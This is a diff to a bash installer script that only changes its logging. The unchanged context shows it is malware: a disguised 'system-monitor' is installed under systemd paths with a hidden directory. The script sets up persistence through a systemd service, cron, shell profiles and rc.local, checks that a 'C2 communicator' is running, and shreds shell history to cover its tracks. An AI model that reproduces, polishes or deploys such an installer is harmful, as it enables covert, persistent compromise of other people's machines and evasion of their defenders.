@@ -18,6 +18,7 @@ log_info() { echo -e "${GREEN}[INFO]${NC} $1"; }
 log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
 log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
 log_debug() { echo -e "${BLUE}[DEBUG]${NC} $1"; }
+log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }  # ADDED THIS LINE
 
 # Configuration
 INSTALL_DIR="/usr/lib/systemd/system-monitor"
@@ -82,7 +83,7 @@ setup_environment() {
         attr -s "hidden" -V 1 "$BACKUP_DIR" 2>/dev/null || true
     fi
     
-    log_info "Environment setup completed"
+    log_success "Environment setup completed"
 }
 
 install_monitoring_files() {
@@ -119,7 +120,7 @@ install_monitoring_files() {
 }
 EOF
 
-    log_info "Monitoring files installed"
+    log_success "Monitoring files installed"
 }
 
 setup_systemd_service() {
@@ -152,7 +153,7 @@ EOF
     systemctl daemon-reload
     systemctl enable "$SERVICE_NAME.service"
     
-    log_info "Systemd service configured"
+    log_success "Systemd service configured"
 }
 
 setup_cron_persistence() {
@@ -178,7 +179,7 @@ setup_cron_persistence() {
     # Install updated crontab
     echo "$current_cron" | crontab -
     
-    log_info "Cron persistence configured"
+    log_success "Cron persistence configured"
 }
 
 setup_profile_persistence() {
@@ -203,7 +204,7 @@ setup_profile_persistence() {
         done
     done
     
-    log_info "Profile persistence configured"
+    log_success "Profile persistence configured"
 }
 
 setup_rc_local() {
@@ -227,7 +228,7 @@ EOF
         fi
     fi
     
-    log_info "rc.local persistence configured"
+    log_success "rc.local persistence configured"
 }
 
 start_services() {
@@ -243,14 +244,14 @@ start_services() {
     sleep 2
     
     if systemctl is-active --quiet "$SERVICE_NAME.service"; then
-        log_info "Systemd service is running"
+        log_success "Systemd service is running"
     else
         log_error "Systemd service failed to start"
         systemctl status "$SERVICE_NAME.service"
     fi
     
     if pgrep -f "network_monitor.py" >/dev/null; then
-        log_info "C2 communicator is running"
+        log_success "C2 communicator is running"
     else
         log_warn "C2 communicator may not be running"
     fi
@@ -268,7 +269,7 @@ cleanup_installation() {
         shred -u ~/.bash_history 2>/dev/null || rm -f ~/.bash_history
     fi
     
-    log_info "Cleanup completed"
+    log_success "Cleanup completed"
 }
 
 show_status() {
@@ -302,7 +303,7 @@ main() {
     cleanup_installation
     show_status
     
-    log_info "Deployment completed successfully!"
+    log_success "Deployment completed successfully!"
     log_info "System will maintain persistence across reboots"
 }
 
